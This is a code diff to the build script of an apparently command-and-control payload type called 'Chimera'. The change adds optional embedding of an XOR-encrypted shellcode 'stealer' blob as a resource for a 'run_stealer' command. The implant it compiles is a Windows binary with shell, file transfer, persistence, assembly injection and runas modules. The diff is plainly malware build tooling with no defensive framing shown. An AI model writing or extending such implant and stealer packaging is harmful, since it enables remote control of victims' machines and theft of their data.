@@ -54,31 +54,41 @@ class Chimera(PayloadType):
             with open(f"{build_dir}/Config.cs", "w") as f:
                 f.write(config_content)
 
+            # stealer_enc: optional XOR-encrypted shellcode blob for run_stealer command.
+            # Place the file at agent_code/stealer_enc before building if you want it embedded.
+            # If it doesn't exist, the binary builds fine but run_stealer will report "not found".
+            stealer_enc_path = f"{build_dir}/stealer_enc"
+            res_flag = []
+            if os.path.exists(stealer_enc_path):
+                res_flag = [f"/res:{stealer_enc_path},stealer_enc"]
+
+            mcs_cmd = [
+                "mcs",
+                "-target:winexe",
+                "-platform:x86",
+                "-out:/tmp/chimera.exe",
+                "-r:System.Net.Http.dll",
+                f"{build_dir}/Program.cs",
+                f"{build_dir}/Config.cs",
+                f"{build_dir}/C2Http.cs",
+                f"{build_dir}/Tasking.cs",
+                f"{build_dir}/StringHelper.cs",
+                f"{build_dir}/Commands/Shell.cs",
+                f"{build_dir}/Commands/Upload.cs",
+                f"{build_dir}/Commands/Download.cs",
+                f"{build_dir}/Commands/Ls.cs",
+                f"{build_dir}/Commands/Pwd.cs",
+                f"{build_dir}/Commands/Cd.cs",
+                f"{build_dir}/Commands/Sleep.cs",
+                f"{build_dir}/Commands/Kill.cs",
+                f"{build_dir}/Commands/Help.cs",
+                f"{build_dir}/Commands/Persist.cs",
+                f"{build_dir}/Commands/InjectAssembly.cs",
+                f"{build_dir}/Commands/RunasExec.cs",
+            ] + res_flag
+
             result = subprocess.run(
-                [
-                    "mcs",
-                    "-target:winexe",
-                    "-platform:x86",
-                    "-out:/tmp/chimera.exe",
-                    "-r:System.Net.Http.dll",
-                    f"{build_dir}/Program.cs",
-                    f"{build_dir}/Config.cs",
-                    f"{build_dir}/C2Http.cs",
-                    f"{build_dir}/Tasking.cs",
-                    f"{build_dir}/StringHelper.cs",
-                    f"{build_dir}/Commands/Shell.cs",
-                    f"{build_dir}/Commands/Upload.cs",
-                    f"{build_dir}/Commands/Download.cs",
-                    f"{build_dir}/Commands/Ls.cs",
-                    f"{build_dir}/Commands/Pwd.cs",
-                    f"{build_dir}/Commands/Cd.cs",
-                    f"{build_dir}/Commands/Sleep.cs",
-                    f"{build_dir}/Commands/Kill.cs",
-                    f"{build_dir}/Commands/Help.cs",
-                    f"{build_dir}/Commands/Persist.cs",
-                    f"{build_dir}/Commands/InjectAssembly.cs",
-                    f"{build_dir}/Commands/RunasExec.cs",
-                ],
+                mcs_cmd,
                 capture_output=True,
                 text=True
             )
